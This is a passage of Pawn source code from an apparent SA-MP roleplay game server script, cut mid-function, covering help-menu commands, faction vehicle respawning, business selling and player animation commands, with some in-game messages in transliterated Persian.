                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /sellgun /materials get /materials deliver"); }
            }
            else if(PlayerInfo[playerid][pJob] == 11) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /heal"); }
            }
            else if(PlayerInfo[playerid][pJob] == 14) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /fare"); }
            }
            else if(PlayerInfo[playerid][pJob] == 16) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** This job doesn't has any command, just start transporting trailers too checkpoint"); }
            }
            else if(PlayerInfo[playerid][pJob] == 18) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** This job doesn't has any command, just start farming with transporting too checkpoint"); }
            }
            else if(PlayerInfo[playerid][pJob] == 20) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** Enter a trash car to start working");
                SendClientMessage(playerid,COLOR_GRAD3,"*** Commands *** /dumptrash"); }
            }
            else if(PlayerInfo[playerid][pJob] == 21) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** Savar Mashin Haye Sherkati Beshavid.");
      	    }
          }
        }
        return 1;
    }
    if(strcmp(cmd, "/cellphonehelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid, COLOR_GRAD3,"*** CELLPHONE *** /call /sms (/p)ickup (/h)angup /number");
        }
        return 1;
    }
	if(strcmp(cmd, "/fvrespawn", true) == 0 || strcmp(cmd, "/fvr", true) == 0)
	{
	    new PM=0;
		for(new i = 0; i < MAX_VEHICLES; i++)
		{
			if(PlayerInfo[playerid][pLeader] == 1 || (PINFO[playerid][pMember] == 1 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsALSPDCar(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 2 || (PINFO[playerid][pMember] == 2 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAFBICar(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 3 || (PINFO[playerid][pMember] == 3 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsANGCar(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 4 || (PINFO[playerid][pMember] == 4 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAnAmbulance(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=4; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 5 || (PINFO[playerid][pMember] == 5 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=5; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 6 || (PINFO[playerid][pMember] == 6 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar2(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=6; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 7 || (PINFO[playerid][pMember] == 7 && PINFO[playerid][pRank] >= 6))
			{
			    if(i == MayorVeh)
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 8 || (PINFO[playerid][pMember] == 8 && PINFO[playerid][pRank] >= 6))
			{
				if(IsAnHitmanCar(i))
				{
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 9 || (PINFO[playerid][pMember] == 9 && PINFO[playerid][pRank] >= 6))
			{
				if(IsANrcar(i))
				{
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 10 || (PINFO[playerid][pMember] == 10 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAnTaxiCar(i))
				{
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 11 || (PINFO[playerid][pMember] == 11 && PINFO[playerid][pRank] >= 6))
			{
			    if(i == SLVeh[0] || i == SLVeh[1] || i == SLVeh[2] || i == SLVeh[3] || i == SLVeh[4] || i == SLVeh[5])
				{
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=11; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 12 || (PINFO[playerid][pMember] == 12 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar4(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=12;}
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 13 || (PINFO[playerid][pMember] == 13 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar5(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=13; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 14 || (PINFO[playerid][pMember] == 14 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar6(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); PM=14; }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 15 || (PINFO[playerid][pMember] == 15 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar7(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 16 || (PINFO[playerid][pMember] == 16 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar3(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 17 || (PINFO[playerid][pMember] == 17 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar17(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 19 || (PINFO[playerid][pMember] == 19 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsAGangCar19(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
			if(PlayerInfo[playerid][pLeader] == 20 || (PINFO[playerid][pMember] == 20 && PINFO[playerid][pRank] >= 6))
			{
			    if(IsASFPDCar(i))
			    {
					if(IsUnusedMashin(i)) { SetVehicleToRespawn(i); }
					else
					{
						new str[256];
					    format(str,256,"[Faction]: Vasile %i Dar Hale Estefade Tavasote %s Mibashad.",i,PlayerName(GetVehicleDriverID(i)));
					    SCM(playerid,COLOR_ALI,str);
				    }
				}
			}
		}
		if(PM == 4) SendClientMessage(playerid, COLOR_MEDIC,"[Faction]: Mashinhaie Faction Medic Respawn Shodand.");
		if(PM == 5) SendClientMessage(playerid, TEAM_CUN_COLOR,"[Faction]: Mashinhaie Faction Mafia Silence Mafia Respawn Shodand.");
		if(PM == 6) SendClientMessage(playerid, COLOR_TheKillers,"[Faction]: Mashinhaie Faction Mafia The Killers Respawn Shodand.");
		if(PM == 11) SendClientMessage(playerid, COLOR_LIGHTBLUE,"[Faction]: Mashinhaie Faction School Instructor Respawn Shodand.");
		if(PM == 12) SendClientMessage(playerid, COLOR_DangerousTigers,"[Faction]: Mashinhaie Faction Mafia Dangerous Tigers Respawn Shodand.");
		if(PM == 13) SendClientMessage(playerid, COLOR_LegendaryMen,"[Faction]: Mashinhaie Faction Mafia Legendary Men Respawn Shodand.");
		if(PM == 14) SendClientMessage(playerid, COLOR_FNF,"[Faction]: Mashinhaie Faction Mafia Fast N Furious Respawn Shodand.");
		if(PM == 0) SCM(playerid,COLOR_Good,"All unused faction vehicles respawned.");
    	return 1;
    }
    if(strcmp(cmd, "/househelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            SendClientMessage(playerid, COLOR_WHITE,"*** HOUSE HELP *** type a command for more help");
            SendClientMessage(playerid, COLOR_GRAD3,"*** HOUSE *** /houseinfo /open /healupgrade(/hu) /setrentable /sellhouse");
            SendClientMessage(playerid, COLOR_GRAD3,"*** HOUSE *** /evictall /setrent /evict /housewithdraw /renters /sellhousetostate");
        }
        return 1;
    }
    if(strcmp(cmd, "/renthelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            SendClientMessage(playerid, COLOR_WHITE,"*** RENTING HELP *** type a command for more help");
            SendClientMessage(playerid, COLOR_GRAD3,"*** HOME *** /rentroom /unrentroom");
            SendClientMessage(playerid, COLOR_GRAD3,"*** Vehicle *** /lock /unrentvehicle /findrentveh");
        }
        return 1;
    }
    if(strcmp(cmd, "/businesshelp", true) == 0 || strcmp(cmd, "/bizhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            SendClientMessage(playerid, COLOR_WHITE,"*** BUSINESS HELP *** type a command for more help");
            SendClientMessage(playerid, COLOR_GRAD3,"*** BUSINESS *** /bizinfo /bizfee /bizname /sbizdeposit /prodprice /sellbiztostate");
            SendClientMessage(playerid, COLOR_GRAD3,"*** BUSINESS *** /open /sellbiz /sellsbiz /sbizwithdraw /bizdeposit /bizwithdraw");
        }
        return 1;
    }
    if(!strcmp(cmd,"/sellbiztostate",true))
    {
        if(PINFO[playerid][pPbiskey] == 9999) return SCM(playerid,COLOR_ALI,"You haven't any business.");
        new buz = PINFO[playerid][pPbiskey];
        if(buz < 500)
        {
            if(!IsPlayerInRangeOfPoint(playerid,5,BizzInfo[buz][bEntranceX],BizzInfo[buz][bEntranceY],BizzInfo[buz][bEntranceZ]) && (Mahal[playerid] != 15 && TooBiz[playerid] != buz)) return SCM(playerid,COLOR_ALI,"You must be near of the biz door or you must enter it.");
            new price = (BizzInfo[buz][bBuyPrice] * 50)/(100);
            format(string,sizeof string,"Are you accept to sell your bizz to state with $%s?\n\nIf you accept press on accept, else press on decline.",FormatNumber(price));
            ShowPlayerDialog(playerid,9743,DIALOG_STYLE_MSGBOX,"Sell Biz To State:",string,"Accept","Decline");
            return 1;
        }
        else
        {
            if(!IsPlayerInRangeOfPoint(playerid,5,SBizzInfo[buz-500][sbEntranceX],SBizzInfo[buz-500][sbEntranceY],SBizzInfo[buz-500][sbEntranceZ])) return SCM(playerid,COLOR_ALI,"You must be near of the biz door.");
            new price = (SBizzInfo[buz-500][sbBuyPrice] * 50)/(100);
            format(string,sizeof string,"Are you accept to sell your bizz to state with $%s?\n\nIf you accept press on accept, else press on decline.",FormatNumber(price));
            ShowPlayerDialog(playerid,9744,DIALOG_STYLE_MSGBOX,"Sell Biz To State:",string,"Accept","Decline");
            return 1;
        }
    }
    if(strcmp(cmd, "/leaderhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if ((PlayerInfo[playerid][pLeader] >= 1 || PINFO[playerid][pRank] >= 6) && (PINFO[playerid][pLeader] != 7 && PINFO[playerid][pMember] != 7))
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** LEADER HELP *** type a command for more help");
                SendClientMessage(playerid, COLOR_GRAD3,"*** LEADERS *** /invite /uninvite /setrank /fw(factionwarn) /fuw(factionunwarn) /checkjob /lc /fvrespawn");
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
            }
        }
        return 1;
    }

    if(strcmp(cmd, "/gotolist", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 1 || PINFO[playerid][pHelper] >= 1)
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP LIST *** type a command for more help");
                SendClientMessage(playerid, COLOR_GRAD3,"*** LIST ***  /gotols /gotosf /gotosft /gotolv /gotomark /gotojobplace /gotoairportls");
                SendClientMessage(playerid, COLOR_GRAD3,"*** LIST ***  /gotochilliand /gotobank[ls/lv/sf] /gotods /gotogs /gotosf1 /gotosf2");
                return 1;
            }
            else
            {
                SendClientMessage(playerid,COLOR_YELLOW2,"Error: You are not admin or helper.");
                return 1;
            }
        }
        return 1;
    }
/*----------------------------------------------------------------------------*/
if(strcmp(cmd,"/stopanim",true)==0)
{
    if(IsPlayerConnected(playerid) && GetPlayerAnimationIndex(playerid) && AnimPlay[playerid] == 1)
    {
        StopLoopingAnim(playerid);
        AnimPlay[playerid] = 0;
    }
    if(!GetPlayerAnimationIndex(playerid) && AnimPlay[playerid] == 1)
    {
    AnimPlay[playerid] = 0;
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
    new dancestyle;
    if(strcmp(cmd, "/animlist", true) == 0)
    {
        SendClientMessage(playerid, CRISTIAN, "________________________________________");
        SendClientMessage(playerid,COLOR_ROUZ,"** USAGE: /stopanim for stoped animation or press enter. **");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /chairsit, /chat, /crack /dance, /drunk, /injured, /carlock, /bomb, /elbow, /wank, /follow, /hitch, /carlock,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /lay, /lay2, /smoke, /kiss, /wave, /taichi, /carjack, /vomit, /medic, /girlkiss, /gsign, /win, /face,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /gro, /fallback, /fall, /rap, /knife, /basket, /reload, /aim, /lean, /handsup, /camera, /yes, /heyu, /cop,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /fucku(/hooo), /crossarms, /slapass, /sup, /spray, /headbutt, /smoking, /push, /box, /dealstance, /hide, /endchat,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /carjacked1, /carjacked2, /rcarjack1, /rcarjack2, /lcarjack1, /rcarjack2, /exhaust, /leftslap, /laugh, /lookout,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /airkick, /gkick, /lightcig, /walk, /gwalk, /dealstance, /pee, /fakepee, /loop, /figur, /fstance, /copmove,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /celebrate, /relax, /nod, /cry, /chant, /stretch, /angry, /exhausted, /ghand, /lay3, /die, /benddown, /joint, /highthrow,");
        SendClientMessage(playerid,COLOR_CRS3,"** ANIMATIONS ** /shothead, /rollfall, /lifejump, /hoodfrisked, /tapcig, /shouting, /koface, /akick, /push, /lowbodypush, /lowthrow");
        return 1;
    }
/*----------------------------------------------------------------------------*/
    if(strcmp(cmd, "/fstance", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid,"ped","woman_idlestance",4.0,0,0,0,1,0); AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/shouting", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"RIOT","RIOT_shout",4.0,1,0,0,0,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/tapcig", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"SMOKING","M_smk_tap",3.0,0,0,0,0,0); AnimPlay[playerid] = 1;
         return 1;
    }
        if(!strcmp(cmdtext, "/oedit", true))
    {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
        EditObject(i, objDD[i]);
        SendClientMessage(playerid, 0xFFFFFFFF, "SERVER: You can now edit the object!");
        return 1;
		}
    }
    if(strcmp(cmd, "/koface", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"PED","KO_shot_face",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/hoodfrisked", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"POLICE","crm_drgbst_01",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/lifejump", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"PED","EV_dive",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/rollfall", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"PED","BIKE_fallR",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/shothead", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"PED","KO_shot_stom",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/akick", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid,"POLICE","Door_Kick",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/lowbodypush", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid,"GANGS","shake_carSH",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; return 1; }
    if(strcmp(cmd, "/wank", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PAULNMAC","wank_loop",4.0,1,1,1,1,0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/follow", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"WUZI","Wuzi_follow",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }

    if(strcmp(cmd, "/laugh", true) == 0) {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0); AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/lookout", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0); AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/walk", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if (!strlen(tmp))
        {
            SendClientMessage(playerid,COLOR_GRAD3,"Usage: /walk [1-14]"); return 1;
        }
        new animid = strval(tmp);
        if(animid == 1) { LoopingAnim(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);AnimPlay[playerid] = 1; }
        else if(animid == 2) { LoopingAnim(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);AnimPlay[playerid] = 1; }
        else if(animid == 3) { LoopingAnim(playerid,"FAT","FatWalk",4.1,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 4) { LoopingAnim(playerid,"WUZI","CS_Wuzi_pt1",4.1,1,1,1,1,1);AnimPlay[playerid] = 1; }
        else if(animid == 5) { LoopingAnim(playerid,"WUZI","Wuzi_walk",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 6) { LoopingAnim(playerid,"POOL","Pool_walk",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 7) { LoopingAnim(playerid,"PED","Walk_player",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 8) { LoopingAnim(playerid,"PED","Walk_old",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 9) { LoopingAnim(playerid,"PED","Walk_fatold",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 10) { LoopingAnim(playerid,"PED","woman_walkfatold",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 11) { LoopingAnim(playerid,"PED","woman_walknorm",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 12) { LoopingAnim(playerid,"PED","woman_walkold",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 13) { LoopingAnim(playerid,"PED","woman_walkpro",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else if(animid == 14) { LoopingAnim(playerid,"PED","woman_walkshop",3.0,1,1,1,1,1); AnimPlay[playerid] = 1;}
        else { SendClientMessage(playerid,COLOR_GRAD3,"Usage: /walk [1-14]"); }
        return 1;
    }
    if(strcmp(cmd, "/camera", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid, "CAMERA", "PICCRCH_IN", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/strip", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,COL_SYN,"Syntax: /strip <1-18>");
        switch (strval(tmp))
        {
                case 1: { LoopingAnim(playerid,"STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 2: { LoopingAnim(playerid,"STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 3: { LoopingAnim(playerid,"STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 4: { LoopingAnim(playerid,"STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 5: { LoopingAnim(playerid,"STRIP", "strip_E", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 6: { LoopingAnim(playerid,"STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 7: { LoopingAnim(playerid,"STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1 ); AnimPlay[playerid] = 1; }
                case 8: { LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 9: { LoopingAnim(playerid, "CAR", "FLAG_DROP", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 10: { LoopingAnim(playerid, "CASINO", "MANWIND", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 11:{ LoopingAnim(playerid, "DANCING", "DAN_DOWN_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 12:{ LoopingAnim(playerid, "DANCING", "DAN_LEFT_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 13:{ LoopingAnim(playerid, "DANCING", "DAN_LOOP_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 14:{ LoopingAnim(playerid, "DANCING", "DAN_RIGHT_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 15:{ LoopingAnim(playerid, "DANCING", "DAN_UP_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 16:{ LoopingAnim(playerid, "DANCING", "DNCE_M_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 17:{ LoopingAnim(playerid, "DANCING", "DNCE_M_D", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
